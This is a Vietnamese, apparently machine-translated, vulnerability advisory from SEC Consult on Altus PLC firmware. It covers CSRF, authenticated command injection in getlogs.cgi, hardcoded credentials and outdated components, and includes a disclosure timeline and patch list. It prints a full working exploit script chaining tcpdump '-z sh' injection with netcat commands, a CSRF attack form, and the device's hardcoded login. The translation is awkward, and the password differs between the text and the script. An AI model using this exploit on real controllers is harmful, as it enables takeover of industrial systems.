---
title: Altus Sistemas de Automacao Products CSRF / Chèn lệnh/ Thông tin xác thực được mã hóa cứng
date: 21/8/2021
layout: single
header:
  teaser: https://i.ytimg.com/vi/QjvcsHRBi4g/maxresdefault.jpg
--- 

## Altus

Tác giả: D. Teuchert T. Weber (Office Vienna) 
         
Nhiều sản phẩm Hệ thống tự động hóa Altus 

 1. Nexto NX30xx Series 
 2. Nexto NX5xxx Series 
 3. Nexto Xpress XP3xx Series 
 4. Hadron Xtorm HX3040 Series 


+ CVE number: CVE-2021-39243
+ homepage: https://www.altus.com.br/
+ found: 2020-05-20
+ [sec-consult.com](https://www.sec-consult.com)

## Mô tả nhà cung cấp
Là một tham chiếu tài liệu cho thị trường tự động hóa trong hơn 35 năm, Altus Sistemas de Automação S.A. cung cấp một dòng sản phẩm hoàn chỉnh nhiều đáp ứng, nhiều nhu cầu của khách hàng trong một số lĩnh vực trong nước và quốc tế thị trường. Được phát triển với công nghệ riêng, các giải pháp mang lại giá trị gia tăng cao cho khách hàng doanh nghiệp, cho phép năng suất an toàn và tin cậy tự động hóa ứng dụng và tự động hóa công việc

Thành viên của Parit Joinações một công ty mẹ trong lĩnh vực công nghệ, lĩnh vực này cũng kiểm soát Teikon S.A., một công ty có hoạt động trên thị trường sản xuất điện tử và RT Tecnologia Médica, một công ty hoạt động trong thị trường X quang

Source: [www.altus.com.br/sobre](https://www.altus.com.br/sobre)

## Khuyến nghị kinh doanh
Nhà cung cấp cung cấp một bản vá lỗi sẽ được cài đặt ngay lập tức.

SEC Consult khuyến nghị thực hiện đánh giá bảo mật kỹ lưỡng về các các sản phẩm do các chuyên gia bảo mật tiến hành để xác định và giải quyết tất cả vấn đề an ninh

## Mô tả tổng quan về lỗ hổng bảo mật
1. Chèn lệnh bán mù được xác thực thông qua tiêm tham số (CVE-2021-39244) Tập lệnh getlogs.cgi cho phép người dùng đã xác thực bắt đầu tcpdump trên thiết bị. Bằng cách đưa tải trọng vào các thông số cụ thể, nó cũng có thể thực hiện các lệnh hệ điều hành tùy ý. Đầu ra của các lệnh này có thể được lấy trong bước khác

2. Truy vấn yêu cầu trên nhiều trang web (CSRF) (CVE-2021-39243) Giao diện web được sử dụng để đặt tất cả các cấu hình dễ bị tấn công các cuộc tấn công giả mạo yêu cầu trên nhiều trang web. Kẻ tấn công có thể thay đổi cài đặt theo cách này bằng cách dụ nạn nhân vào một trang web độc hại

3. Thông tin đăng nhập được mã hóa cứng cho Điểm cuối CGI (CVE-2021-39245) Tập lệnh getlogs.cgi được bảo vệ bằng htaccess độc quyền bằng mã cứng thông tin xác thực. Chúng được chia sẻ với tất cả các hình ảnh phần sụn từ dòng NX30xx, HX30xx và XP3xx.Các thông tin đăng nhập được mã hóa cứng này có thể được sử dụng để truy cập thiết bị không có tài khoản người dùng hợp lệ ở cấp ứng dụng và không thể thay đổi trong giao diện người dùng. Kết hợp với lỗ hổng 1), thỏa hiệp hoàn toàn ở cấp hệ thống với điều kiện tiên quyết duy nhất là truy cập mạng có thể được thực hiện

4. Các thành phần phần mềm lỗi thời và dễ bị tổn thương Quá trình quét tĩnh với Trình kiểm tra IoT đã tiết lộ các gói phần mềm lỗi thời được sử dụng trong chương trình cơ sở của thiết bị

Bộ công cụ BusyBox được sử dụng đã lỗi thời và chứa nhiều các lỗ hổng. Phiên bản lỗi thời đã được tìm thấy bởi Thanh tra IoT. Một trong những các lỗ hổng được phát hiện (CVE-2017-16544) đã được xác minh bằng cách sử dụng MEDUSA thời gian chạy phần sụn có thể mở rộng

## Proof of concept
Chèn lệnh bán mù được xác thực thông qua tiêm tham số (CVE-2021-39244) Trích xuất chương trình cơ sở sau của getlogs.cgi hiển thị lỗ hổng bảo mật:

```shell
TCPDUMP_IFACE=`echo "$QUERY_STRING" | sed -n 's/^.*tcpdump_iface=\([^&]*\).*$/\1/p' | sed "s/%20/ /g"`
TCPDUMP_COUNT=`echo "$QUERY_STRING" | sed -n 's/^.*tcpdump_count=\([^&]*\).*$/\1/p' | sed "s/%20/ /g"`
```

```bash
echo "tcpdump is running ..."
echo "<p>Please, wait the capture of $TCPDUMP_COUNT packets in $TCPDUMP_IFACE.</p>"
chrt -p -f 70 $$
tcpdump -i $TCPDUMP_IFACE -c $TCPDUMP_COUNT -w /tmp/capture.pcap
mount / -o rw,remount
ln -s /tmp/capture.pcap /usr/www/capture.pcap
mount / -o ro,remount
echo "<a href=\"capture.pcap\" download=\"$TCPDUMP_IFACE-capture.pcap\">Click here to download the capture file</a>"
```

Như có thể thấy, các biến $ TCPDUMP_COUNT và $ TCPDUMP_IFACE được sử dụng chưa được lọc trong lệnh tcpdump. Điều này có nghĩa là có thể tiêm tham số tùy ý cho lệnh tcpdump. Cờ -z cho tcpdump cho phép xác định một chương trình sẽ chạy trên tệp chụp. Hành động này có thể được sử dụng để thực hiện các lệnh tùy ý. Yêu cầu sau đưa các thông số vào, vì vậy tcpdump đó sẽ lắng nghe trên cổng UDP 1234 và sẽ thực thi tệp chụp với sh:

```powershell
GET /getlogs.cgi?logtype=tcpdump&tcpdump_iface=eth0&tcpdump_count=1%20-G%201%20-z%20sh%20-U%20-A%20udp%20port%201234 HTTP/1.1
Host: $IP
Authorization: Basic YWx0dXM6bmV4dG8xMjM0
```

Bước tiếp theo để khai thác lỗ hổng này là gửi các lệnh đến cổng UDP 1234:

```bash
$ echo -e ";\n$CMD &>/tmp/capture.pcap;\n'\n$CMD &>/tmp/capture.pcap;" | nc -u $TARGET_HOST $UDP_PORT
```
Lệnh được gửi hai lần vì có thể, tệp chứa "'" trước trọng tải đã gửi. Chích lệnh hai lần bằng dấu "'" ở giữa đảm bảo rằng lệnh sẽ được thực thi bởi sh và không được hiểu là một chuỗi. Đầu ra của lệnh đã thực thi được chuyển hướng đến
tệp capture.pcap có thể được truy cập thông qua yêu cầu sau

```powershell
GET /capture.pcap HTTP/1.1
Host: $IP
```

Ba bước này được kết hợp trong kịch bản bằng chứng về khái niệm sau:

```bash
#!/bin/bash
#Author: D. Teuchert
CMD="whoami"
if [[ $# -eq 1 ]]; then
     CMD=$1
fi
TARGET_HOST="192.168.100.123"
UDP_PORT=1234
BASIC_AUTH_USERNAME="altus"
BASIC_AUTH_PASSWORD="nexto1234"
BASIC_AUTH_HEADER=$(printf "$BASIC_AUTH_USERNAME:$BASIC_AUTH_PASSWORD" | base64)

#Sending HTTP request with parameter injection in tcpdump
#Break out of tcpdump is done via a technique described here:
#https://insinuator.net/2019/07/how-to-break-out-of-restricted-shells-with-tcpdump/
curl -s -k -X "GET" -H "Host: $TARGET_HOST" -H "Authorization: Basic $BASIC_AUTH_HEADER" "http://$TARGET_HOST/getlogs.cgi?logtype=tcpdump&tcpdump_iface=eth0&tcpdump_count=1%20-G%201%20-z%20sh%20-U%20-A%20udp%20port%20$UDP_PORT">/dev/null &
#Send udp packet with payload
echo -e ";\n$CMD &>/tmp/capture.pcap;\n'\n$CMD &>/tmp/capture.pcap;" | nc -u $TARGET_HOST $UDP_PORT
echo -e "Executed \"$CMD\".\nResponse:"
#The output of the executed command was saved in capture.pcap
curl -s -k -X "GET" -H "Host: $TARGET_HOST" "http://$TARGET_HOST/capture.pcap"
```

Truy vấn yêu cầu trên nhiều trang web (CSRF) (CVE-2021-39243) Chứng minh khái niệm CSRF sau đây có thể được sử dụng để thực hiện bước đầu tiên của khai thác lệnh Injection:

```html
<html>
   <body>
   <script>history.pushState('', '', '/')</script>
     <form action="http://$IP/getlogs.cgi">
       <input type="hidden" name="logtype" value="tcpdump" />
       <input type="hidden" name="tcpdump_iface" value="eth0" />
       <input type="hidden" name="tcpdump_count" value="1 -G 1 -z sh -U -A udp port 1234" />
       <input type="submit" value="Submit request" />
     </form>
   </body>
</html>
```

Thông tin đăng nhập được mã hóa cứng cho Điểm cuối CGI (CVE-2021-39245) Thông tin xác thực được mã hóa cứng có trong "/etc/lighttpd/lighttpd-auth.conf": altus: nexto123

Các thông tin xác thực này được sử dụng riêng cho tập lệnh getlogs.cgi. Đây cũng là được mô tả trong lighttpd.conf nằm trong cùng một thư mục:

```php
auth.debug = 0
auth.backend = "plain"
auth.backend.plain.userfile = "/etc/lighttpd/lighttpd-auth.conf"

auth.require = ( "/cgi/getlogs.cgi" =>
	(
		"method" => "basic",
		"realm" => "Password protected area",
		"require" => "user=altus"
	)
)
```

Các thành phần phần mềm lỗi thời và dễ bị tổn thương dựa trên quá trình quét tự động với, trình kiểm tra IoT của bên thứ ba sau gói phần mềm đã lỗi thời:

```powershell
Altus/Beijer XP3xx:
BusyBox         1.19.4
GNU glibc       2.19
lighttpd        1.4.30
Linux Kernel    4.9.98
OpenSSH         5.9p1
OpenSSL         1.0.0g
OpenSSL         1.1.1b (in CODESYS)
CODESYS Control 3.5.15
```

```powershell
Altus/Beijer NX30xx:
BusyBox         1.1.3
Dropbear SSH    0.45
GNU glibc       2.5
lighttpd        1.4.24-devel-v1.0.0.7-1727-g6fd3998
Linux Kernel    2.6.23
OpenSSL         0.9.8g
OpenSSL         1.1.1b (in CODESYS)
CODESYS Control 3.5.15
```

```powershell
Altus/Beijer HX30xx:
BusyBox         1.19.4
GNU glibc       2.11.1
lighttpd        1.4.30
Linux Kernel    3.0.75
OpenSSH         5.9p1
OpenSSL         1.0.0g
OpenSSL         1.0.2j (in CODESYS)
CODESYS Control 3.5.12.65
```

Lỗ hổng tự động hoàn thành trình bao BusyBox (CVE-2017-16544) đã được xác minh trên một thiết bị giả lập

Tệp có tên `\ectest\n\e]55;test.txt\a` đã được tạo để kích hoạt sự dễ bị tổn thương.

```powershell
# ls "pressing <TAB>"
test
55\;test.txt
```

Các lỗ hổng 1 2 3 4 đã được xác minh thủ công trên một thiết bị giả lập bằng cách sử dụng thời gian chạy chương trình cơ sở có thể mở rộng MEDUSA

## Phiên bản dễ bị tổn thương / đã thử nghiệm:

```powershell
The following firmware versions have been found to be vulnerable:
Altus/Beijer Nexto NX3003 / 1.8.11.0
Altus/Beijer Nexto NX3004 / 1.8.11.0
Altus/Beijer Nexto NX3005 / 1.8.11.0
Altus/Beijer Nexto NX3010 / 1.8.3.0
Altus/Beijer Nexto NX3020 / 1.8.3.0
Altus/Beijer Nexto NX3030 / 1.8.3.0
Altus/Beijer Nexto Xpress XP300 / 1.8.11.0
Altus/Beijer Nexto Xpress XP315 / 1.8.11.0
Altus/Beijer Nexto Xpress XP325 / 1.8.11.0
Altus/Beijer Nexto Xpress XP340 / 1.8.11.0
Altus/Beijer Hadron Xtorm HX3040 / 1.7.58.0

The following versions are also vulnerable according to the vendor:
Altus/Beijer Nexto NX5100 / 1.8.11.0
Altus/Beijer Nexto NX5101 / 1.8.11.0
Altus/Beijer Nexto NX5110 / 1.1.2.8
Altus/Beijer Nexto NX5210 / 1.1.2.8
```

## Tiến trình liên hệ với nhà cung cấp
+ 2020-05-25: Liên hệ với VDE CERT qua info@cert.vde.com. Nhận
             xác nhận từ VDE CERT.

+ 2020-05-01 - 2020-09-01: Nhiều email và cuộc gọi điện thoại với VDE CERT.
             Các liên hệ của VDE CERT cho biết, nhà cung cấp đã không phản hồi về bất kỳ
             tin nhắn hoặc cuộc gọi.

+ 2020-09-30: Viết một thông điệp cho SVP R&D và Chuỗi cung ứng của Beijer
             Thiết bị điện tử. Không có câu trả lời.

+ 2020-10-05: Gọi nhờ bộ phận trợ giúp của Beijer Electronics AB. Liên hệ đã nêu
             rằng không có trường hợp nào liên quan đến lỗ hổng bảo mật đã được mở và tạo một lỗ hổng bảo mật.
             Các chủ sở hữu sản phẩm của Westermo, Korenix và Beijer Electronics đã
             thông qua cuộc điều tra này. Đặt ngày công bố là ngày 25 tháng 11 năm 2020.

+ 2020-10-06: Bắt đầu lại toàn bộ quy trình tiết lộ có trách nhiệm bằng cách gửi
             yêu cầu liên hệ bảo mật mới cs@beijerelectronics.com.

+ 2020-11-11: Đã hỏi đại diện của Korenix và Beijer về
             trạng thái. Không có câu trả lời.

+ 20-11-25: Cuộc điện thoại với giám đốc an ninh của Beijer. Đã gửi lời khuyên qua
             kho lưu trữ được mã hóa tới cs@beijerelectronics.com. Nhận
             xác nhận nhận tư vấn. Giám đốc an ninh nói  rằng anh ấy
             có thể cung cấp thông tin về thời hạn cho các bản vá
             trong vòng hai tuần tới.
+ 2020-12-09: Yêu cầu cập nhật.

+ 2020-12-18: Gọi điện với giám đốc an ninh của Beijer. Nhà cung cấp xuất trình ban đầu
             phân tích được thực hiện bởi các công ty bị ảnh hưởng, cũng là Altus. Sơ bộ
             kế hoạch sửa chữa các lỗ hổng bảo mật đã được trình bày. Altus đã tuyên bố với
             khắc phục sự cố số 1 vào tháng 1 và các lỗ hổng bảo mật khác vào tháng 3 hoặc
             Tháng tư.

+ 2021-03-21: Giám đốc bảo mật đã mời SEC Consult để có một cuộc họp trạng thái.

+ 2021-03-25: Altus đã sửa lỗ hổng # 1. Bàn giao việc xử lý tham mưu cho
             Nhân viên của Altus sẽ được thực hiện vào tháng Tư. Nhà cung cấp phát hành đã sửa
             phần sụn liên quan đến vấn đề số 1.

+ 2021-04-09: Gặp gỡ Altus. Nhà cung cấp không đồng ý với một
             lỗ hổng bảo mật, đã được xác định trên thiết bị giả lập. Vì vậy,
             nó đã bị xóa khỏi tư vấn. Các lỗ hổng # 2 và # 3 là
             dự định sẽ được sửa vào đầu năm nay nhưng các bản phát hành đã thay đổi do
             đến Covid. Phiên bản firmware mới sẽ được phát hành vào tháng 7 năm 2021.

+ 2021-04-22: Yêu cầu cập nhật; Không có câu trả lời.

+ 2021-05-04: Yêu cầu cập nhật.

+ 2021-05-07: Nhà cung cấp đang thực hiện các bản sửa lỗi bảo mật.

+ 2021-05-11: Nhà cung cấp đã gửi mốc thời gian cho các bản sửa lỗi và thông tin chi tiết về phiên bản.
             Hai mô hình bổ sung đã được thêm vào các thiết bị bị ảnh hưởng bởi
             người bán.

+ 2021-06-10: Đã thêm thông tin bổ sung và hỏi liệu có cần thêm thời gian hay không.

+ 2021-06-10: Nhà cung cấp đã thêm số phiên bản bị ảnh hưởng và yêu cầu ngày đầu tiên của
             Tháng 8 là ngày phát hành mới.

+ 2021-06-15: Đặt ngày phát hành là ngày 1 tháng 8.

+ 2021-07-28: Nhà cung cấp đã gửi số phiên bản cho phần sụn cố định và yêu cầu
             hoãn việc phát hành đến ngày 6 tháng 8 để hoàn thành
             tài liệu.

+ 2021-08-16: Do nghỉ lễ, Lỗ hổng bảo mật tư vấn của SEC đã bị đóng. Nắm được tin tức
             nhà cung cấp để đưa ra lời khuyên trong bốn ngày tới.

+ 2021-08-17: Nhận được ID CVE.

+ 2021-08-18: Nhà cung cấp được thông báo sẽ phát hành tư vấn vào 2021-08-19.

+ 2021-08-19: Phối hợp phát hành tư vấn bảo mật.

## Solution
Theo nhà cung cấp, các bản vá lỗi sau phải được áp dụng để khắc phục sự cố 1 2 và 3

```powershell
XP300 - v1.11.2.0
XP315 - v1.11.2.0
XP325 - v1.11.2.0
XP340 - v1.11.2.0
BCS-NX3003 - v1.11.2.0
BCS-NX3004 - v1.11.2.0
BCS-NX3005 - v1.11.2.0
BCS-NX3010 - v1.9.1.0
BCS-NX3020 - v1.9.1.0
BCS-NX3030 - v1.9.1.0
BCS-NX5100 - v1.11.2.0
BCS-NX5101 - v1.11.2.0
BCS-NX5110 - v1.11.2.0
BCS-NX5210 - v1.11.2.0
BCS-HX3040 - v1.11.2.0
```
Tuyên bố của nhà cung cấp liên quan đến vấn đề 4

Altus liên tục tích hợp các tính năng mới và các bản sửa lỗi trong sản phẩm, phát hành phiên bản phần sụn mới. Thường thì những cải tiến đó yêu cầu phần mềm các gói nâng cấp vì một số lý do, bao gồm cả bảo mật. Khi điều này xảy ra, thực hiện một loạt các bài kiểm tra để đảm bảo rằng hiệu suất, độ tin cậy và bảo mật không bị ảnh hưởng tiêu cực bởi các bản nâng cấp. Mặc dù đã biết lỗ hổng trong một số phiên bản gói phần mềm, những lỗ hổng đó có thể chỉ được khai thác nếu biên dịch các tính năng cụ thể đó và cung cấp các phương tiện để khai thác chúng. Ví dụ, vấn đề được SEC Consult chỉ ra yêu cầu một thiết bị đầu cuối được khai thác mà không cung cấp trong phần cứng thực. Ngày nay, không có bất kỳ lỗ hổng có thể khai thác nào đã biết do phần mềm lỗi thời gây ra gói trong các sản phẩm . Do đó, mặt hàng này không được coi là lỗ hổng bảo mật bởi tác giả

## Cách giải quyết
Hạn chế quyền truy cập mạng vào thiết bị.

## URL tư vấn
[https://sec-consult.com/vulnerability-lab/](https://sec-consult.com/vulnerability-lab/)



